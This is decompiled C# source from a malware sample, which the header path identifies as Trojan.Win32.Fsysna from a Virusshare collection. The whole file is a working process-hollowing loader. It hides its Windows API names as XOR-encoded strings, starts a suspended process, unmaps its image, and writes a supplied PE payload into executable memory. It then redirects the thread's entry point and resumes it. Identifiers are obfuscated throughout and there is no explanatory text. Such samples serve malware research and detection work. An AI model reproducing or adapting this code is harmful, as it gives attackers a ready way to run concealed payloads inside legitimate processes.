// Decompiled with JetBrains decompiler
// Type: ÕëHjù
// Assembly: jèÜQµ27Ôm, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FE0D329C-FA3B-4EE0-89E7-48030744455C
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00007-msil\Trojan.Win32.Fsysna.bydn-488477d363303e072cc98559d8ae078eb8de2cbf1959d8931c19034bb2df4ca4.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Runtime.InteropServices;
using System.Security;
using System.Text;

[StandardModule]
public sealed class ÕëHjù
{
  [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string ñÅªN5sµM7gÎý8EàÈe6ª7gºß);

  [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern IntPtr GetProcAddress(
    IntPtr xµà9AÈú1SØªwºKácÆ80kÕºYðôÝªAño9sÚù6,
    [MarshalAs(UnmanagedType.VBByRefStr)] ref string name);

  public static jÒHìºû4Ö Ør7YjöTÁ<jÒHìºû4Ö>(string ª6nÞø4µ, string ºøÎEgºèÔ6A) => (jÒHìºû4Ö) Marshal.GetDelegateForFunctionPointer(ÕëHjù.GetProcAddress(ÕëHjù.LoadLibraryA(ref ª6nÞø4µ), ref ºøÎEgºèÔ6A), typeof (jÒHìºû4Ö));

  public static void Òµw4µÞø(byte[] ºÙRñÕ2eªJ, string ßzºXÅ9tõµ)
  {
    ÕëHjù.jµy4ºØõ jµy4ºØõ = ÕëHjù.Ør7YjöTÁ<ÕëHjù.jµy4ºØõ>(ºé1ØPa9NüxÏµÅ3Ùo9Aðª.µmïP2ÂFªª5BåtÙGb8("270B4B5D29020A01", "Ln93"), ºé1ØPa9NüxÏµÅ3Ùo9Aðª.µmïP2ÂFªª5BåtÙGb8("06025D24045D15025726154B3631", "Ep8"));
    ÕëHjù.EºÆjZªàÊ eºÆjZªàÊ = ÕëHjù.Ør7YjöTÁ<ÕëHjù.EºÆjZªàÊ>(ºé1ØPa9NüxÏµÅ3Ùo9Aðª.µmïP2ÂFªª5BåtÙGb8("1250353F1C597463", "y5GQ"), ºé1ØPa9NüxÏµÅ3Ùo9Aðª.µmïP2ÂFªª5BåtÙGb8("0908401A05462B0C500D025A3A084C3A", "Nm4"));
    ÕëHjù.µkág1ºÙô µkág1ºÙô = ÕëHjù.Ør7YjöTÁ<ÕëHjù.µkág1ºÙô>(ºé1ØPa9NüxÏµÅ3Ùo9Aðª.µmïP2ÂFªª5BåtÙGb8("391754143B", "Wc0x"), ºé1ØPa9NüxÏµÅ3Ùo9Aðª.µmïP2ÂFªª5BåtÙGb8("34472F5D17520A6513560D7C1C601F500E5A155D", "z3"));
    ÕëHjù.Cås6µù cås6µù = ÕëHjù.Ør7YjöTÁ<ÕëHjù.Cås6µù>(ºé1ØPa9NüxÏµÅ3Ùo9Aðª.µmïP2ÂFªª5BåtÙGb8("3903451F370A0443", "Rf7q"), ºé1ØPa9NüxÏµÅ3Ùo9Aðª.µmïP2ÂFªª5BåtÙGb8("06175702040059053101452B311F59142D", "Tr6f"));
    ÕëHjù.Nû7KùÅ nû7KùÅ1 = ÕëHjù.Ør7YjöTÁ<ÕëHjù.Nû7KùÅ>(ºé1ØPa9NüxÏµÅ3Ùo9Aðª.µmïP2ÂFªª5BåtÙGb8("28023109260B7055", "Cg"), ºé1ØPa9NüxÏµÅ3Ùo9Aðª.µmïP2ÂFªª5BåtÙGb8("0C1928042F113631361C35131F08", "Zp"));
    ÕëHjù.º5aÆì4ªM º5aÆì4ªM1 = ÕëHjù.Ør7YjöTÁ<ÕëHjù.º5aÆì4ªM>(ºé1ØPa9NüxÏµÅ3Ùo9Aðª.µmïP2ÂFªª5BåtÙGb8("3114281F3F1D6943", "Zq"), ºé1ØPa9NüxÏµÅ3Ùo9Aðª.µmïP2ÂFªª5BåtÙGb8("2F42220C551B0A5F281D4338355526174232", "x0K"));
    ÕëHjù.wÜçÈá7pQ wÜçÈá7pQ = ÕëHjù.Ør7YjöTÁ<ÕëHjù.wÜçÈá7pQ>(ºé1ØPa9NüxÏµÅ3Ùo9Aðª.µmïP2ÂFªª5BåtÙGb8("291C452C1C5B714B", "By7"), ºé1ØPa9NüxÏµÅ3Ùo9Aðª.µmïP2ÂFªª5BåtÙGb8("3D50303A5D360B54202D5A2A1A503C1A", "n5D"));
    ÕëHjù.û9XqºçÀY9 û9XqºçÀy9 = ÕëHjù.Ør7YjöTÁ<ÕëHjù.û9XqºçÀY9>(ºé1ØPa9NüxÏµÅ3Ùo9Aðª.µmïP2ÂFªª5BåtÙGb8("0A543F0F54215203", "a1M"), ºé1ØPa9NüxÏµÅ3Ùo9Aðª.µmïP2ÂFªª5BåtÙGb8("110042360854170D43260455", "Ce1"));
    int int32 = BitConverter.ToInt32(ºÙRñÕ2eªJ, 60);
    int int16 = (int) BitConverter.ToInt16(ºÙRñÕ2eªJ, checked (int32 + 6));
    IntPtr num1 = new IntPtr(BitConverter.ToInt32(ºÙRñÕ2eªJ, checked (int32 + 84)));
    byte[] µ8ÉdêJnîwºå3WÇ2õEª = new byte[68];
    IntPtr[] cºÆûM1ª5KsýÃfÜë0µßµRýg4f = new IntPtr[4];
    IntPtr num2;
    if (!jµy4ºØõ((string) null, new StringBuilder(ßzºXÅ9tõµ), num2, num2, false, 4, num2, (string) null, µ8ÉdêJnîwºå3WÇ2õEª, cºÆûM1ª5KsýÃfÜë0µßµRýg4f))
      return;
    uint[] numArray = new uint[179];
    numArray[0] = 65538U;
    IntPtr y4ºØõTEªÇz0ìà3sµNÐtÅåN6ºªCr7úÈp5Sƒ;
    IntPtr à8ºÌMw9YûªsÄTß0ÿµkæ4ZmÙªfµæ8YcÁÀ5ZaªÿéÅ;
    if (eºÆjZªàÊ(cºÆûM1ª5KsýÃfÜë0µßµRýg4f[1], numArray) && cås6µù(cºÆûM1ª5KsýÃfÜë0µßµRýg4f[0], new IntPtr(checked ((long) numArray[41] + 8L)), ref y4ºØõTEªÇz0ìà3sµNÐtÅåN6ºªCr7úÈp5Sƒ, new IntPtr(4), ref à8ºÌMw9YûªsÄTß0ÿµkæ4ZmÙªfµæ8YcÁÀ5ZaªÿéÅ) && µkág1ºÙô(cºÆûM1ª5KsýÃfÜë0µßµRýg4f[0], y4ºØõTEªÇz0ìà3sµNÐtÅåN6ºªCr7úÈp5Sƒ) == 0U)
    {
      ÕëHjù.Nû7KùÅ nû7KùÅ2 = nû7KùÅ1;
      IntPtr yàµÉM5éªÙ2aQdÛYº3åDº4ZîÃ9ºpiÁªP4í7 = cºÆûM1ª5KsýÃfÜë0µßµRýg4f[0];
      IntPtr num3 = new IntPtr(BitConverter.ToInt32(ºÙRñÕ2eªJ, checked (int32 + 52)));
      IntPtr ª8LÕönÛQïfµ0þjº4MømÊjLéÂ9µEª = num3;
      IntPtr num4 = new IntPtr(BitConverter.ToInt32(ºÙRñÕ2eªJ, checked (int32 + 80)));
      int ÿbª1Cß2µùw9ÊûªG = (int) checked ((uint) (int) num4);
      IntPtr num5 = nû7KùÅ2(yàµÉM5éªÙ2aQdÛYº3åDº4ZîÃ9ºpiÁªP4í7, ª8LÕönÛQïfµ0þjº4MømÊjLéÂ9µEª, (uint) ÿbª1Cß2µùw9ÊûªG, 12288U, 64U);
      ÕëHjù.º5aÆì4ªM º5aÆì4ªM2 = º5aÆì4ªM1;
      IntPtr ªÖ0énHÄaæBþ1nªÀï1 = cºÆûM1ª5KsýÃfÜë0µßµRýg4f[0];
      IntPtr øÆªS5oZõ0ºÙãYpµ8ñ0ªÉdAiKÿº7Æ1 = num5;
      byte[] aµÃ7àB2DoºÍúÏfºûM6ïÊxS2µÎY4_1 = ºÙRñÕ2eªJ;
      int Ûþ4wBª9SºÞàxª6DÄÔèQºr3Zg7_1 = (int) checked ((uint) (int) num1);
      int num6 = (int) à8ºÌMw9YûªsÄTß0ÿµkæ4ZmÙªfµæ8YcÁÀ5ZaªÿéÅ;
      ref int local1 = ref num6;
      int num7 = º5aÆì4ªM2(ªÖ0énHÄaæBþ1nªÀï1, øÆªS5oZõ0ºÙãYpµ8ñ0ªÉdAiKÿº7Æ1, aµÃ7àB2DoºÍúÏfºûM6ïÊxS2µÎY4_1, (uint) Ûþ4wBª9SºÞàxª6DÄÔèQºr3Zg7_1, out local1) ? 1 : 0;
      IntPtr num8 = (IntPtr) num6;
      bool flag = num7 != 0;
      int num9 = checked (int16 - 1);
      int num10 = 0;
      while (num10 <= num9)
      {
        int[] dst1 = new int[10];
        Buffer.BlockCopy((Array) ºÙRñÕ2eªJ, checked (int32 + 248 + num10 * 40), (Array) dst1, 0, 40);
        byte[] dst2 = new byte[checked (dst1[4] - 1 + 1)];
        Buffer.BlockCopy((Array) ºÙRñÕ2eªJ, dst1[5], (Array) dst2, 0, dst2.Length);
        ÕëHjù.º5aÆì4ªM º5aÆì4ªM3 = º5aÆì4ªM1;
        IntPtr ªÖ0énHÄaæBþ1nªÀï2 = cºÆûM1ª5KsýÃfÜë0µßµRýg4f[0];
        num4 = new IntPtr(checked (num5.ToInt64() + (long) dst1[3]));
        IntPtr øÆªS5oZõ0ºÙãYpµ8ñ0ªÉdAiKÿº7Æ2 = num4;
        byte[] aµÃ7àB2DoºÍúÏfºûM6ïÊxS2µÎY4_2 = dst2;
        num3 = new IntPtr(dst2.Length);
        int Ûþ4wBª9SºÞàxª6DÄÔèQºr3Zg7_2 = (int) checked ((uint) (int) num3);
        int num11 = (int) num8;
        ref int local2 = ref num11;
        int num12 = º5aÆì4ªM3(ªÖ0énHÄaæBþ1nªÀï2, øÆªS5oZõ0ºÙãYpµ8ñ0ªÉdAiKÿº7Æ2, aµÃ7àB2DoºÍúÏfºûM6ïÊxS2µÎY4_2, (uint) Ûþ4wBª9SºÞàxª6DÄÔèQºr3Zg7_2, out local2) ? 1 : 0;
        num8 = (IntPtr) num11;
        flag = num12 != 0;
        checked { ++num10; }
      }
      ÕëHjù.º5aÆì4ªM º5aÆì4ªM4 = º5aÆì4ªM1;
      IntPtr ªÖ0énHÄaæBþ1nªÀï3 = cºÆûM1ª5KsýÃfÜë0µßµRýg4f[0];
      num4 = new IntPtr(checked ((long) numArray[41] + 8L));
      IntPtr øÆªS5oZõ0ºÙãYpµ8ñ0ªÉdAiKÿº7Æ3 = num4;
      byte[] bytes = BitConverter.GetBytes(num5.ToInt64());
      num3 = new IntPtr(4);
      int Ûþ4wBª9SºÞàxª6DÄÔèQºr3Zg7_3 = (int) checked ((uint) (int) num3);
      int num13 = (int) num8;
      ref int local3 = ref num13;
      int num14 = º5aÆì4ªM4(ªÖ0énHÄaæBþ1nªÀï3, øÆªS5oZõ0ºÙãYpµ8ñ0ªÉdAiKÿº7Æ3, bytes, (uint) Ûþ4wBª9SºÞàxª6DÄÔèQºr3Zg7_3, out local3) ? 1 : 0;
      IntPtr num15 = (IntPtr) num13;
      flag = num14 != 0;
      numArray[44] = checked ((uint) (num5.ToInt32() + BitConverter.ToInt32(ºÙRñÕ2eªJ, int32 + 40)));
      int num16 = wÜçÈá7pQ(cºÆûM1ª5KsýÃfÜë0µßµRýg4f[1], numArray) ? 1 : 0;
    }
    int num17 = û9XqºçÀy9(cºÆûM1ª5KsýÃfÜë0µßµRýg4f[1]);
  }

  [SuppressUnmanagedCodeSecurity]
  [return: MarshalAs(UnmanagedType.Bool)]
  public delegate bool jµy4ºØõ(
    string ÌºA9ùjG5kÕµÈµT0ökKaºëÓ9éEÃ8,
    StringBuilder ºt0ÀñFn7êªJÁª2wðPpEº7Ú,
    IntPtr ÒõEiº7zSªè5ÊØºK4õqø8ªkYÇØö6Cµj,
    IntPtr JØµëg9ÿR6xºÀHªõ1ÎkeÖµê4WàH8ª,
    [MarshalAs(UnmanagedType.Bool)] bool ºËWç4nEøÝcµ89ÓªBbèCâfµÕÿbª1Cß,
    int ª7ÅþBe2ÒúzºEÉåµWd4ìxZÅ9øº2ÊzHtDª9Âò0wÃµâ,
    IntPtr Ûª8òAy9NüµnÄõoCÀº0ªD7ÃºörF9i7QªÔå,
    string ôf6CºØÒ8çnGµ7yÆQªèª2ðÔLiëTº6Ìæ,
    byte[] µ8ÉdêJnîwºå3WÇ2õEª,
    IntPtr[] cºÆûM1ª5KsýÃfÜë0µßµRýg4f);

  [return: MarshalAs(UnmanagedType.Bool)]
  public delegate bool EºÆjZªàÊ(IntPtr µwäD8ÅyPÅåº6ªz7LÜþ3XØûgì9ªßBwµÑ3Xoâ7, uint[] ctxt);

  public delegate uint µkág1ºÙô(IntPtr ºö6MxÖCkÂ4ªàgµ9åÚHEüÏrª0úJã, IntPtr yÞZûµ5ÇªnWÅºö6yK9ÕaWª);

  [return: MarshalAs(UnmanagedType.Bool)]
  public delegate bool Cås6µù(
    IntPtr ËäºJp9Z0êµÍosÝªMë8Ñô3eªN6ºCå1k,
    IntPtr àª0ÀtKpªÉƒSd17,
    ref IntPtr y4ºØõTEªÇz0ìà3sµNÐtÅåN6ºªCr7úÈp5Sƒ,
    IntPtr º7GøjÆ6âªµ9YìkÎÏX,
    ref IntPtr à8ºÌMw9YûªsÄTß0ÿµkæ4ZmÙªfµæ8YcÁÀ5ZaªÿéÅ);

  public delegate int û9XqºçÀY9(IntPtr wºå3WÇ2õEªßbMÔý0Xë9Åtºk);

  public delegate IntPtr Nû7KùÅ(
    IntPtr yàµÉM5éªÙ2aQdÛYº3åDº4ZîÃ9ºpiÁªP4í7,
    IntPtr ª8LÕönÛQïfµ0þjº4MømÊjLéÂ9µEª,
    uint ÿbª1Cß2µùw9ÊûªG,
    uint æqº9ZÝÅ2pAÆû6aL,
    uint q0ªéFÏÆyïP7ºp8ÅµJãAµìÙ3wÉs6ZüºíªMy0Ì2úÔNkµ);

  public delegate bool º5aÆì4ªM(
    IntPtr ªÖ0énHÄaæBþ1nªÀï,
    IntPtr øÆªS5oZõ0ºÙãYpµ8ñ0ªÉdAiKÿº7Æ,
    byte[] aµÃ7àB2DoºÍúÏfºûM6ïÊxS2µÎY4,
    uint Ûþ4wBª9SºÞàxª6DÄÔèQºr3Zg7,
    out int lpNumberOfBytesWritten);

  [return: MarshalAs(UnmanagedType.Bool)]
  public delegate bool wÜçÈá7pQ(IntPtr µÛ1ètNXýÏúr8ÄAªGºåyÅ5µz0Î, uint[] ªÎ7Fåzî8Dºìº3xMÔÝj);
}
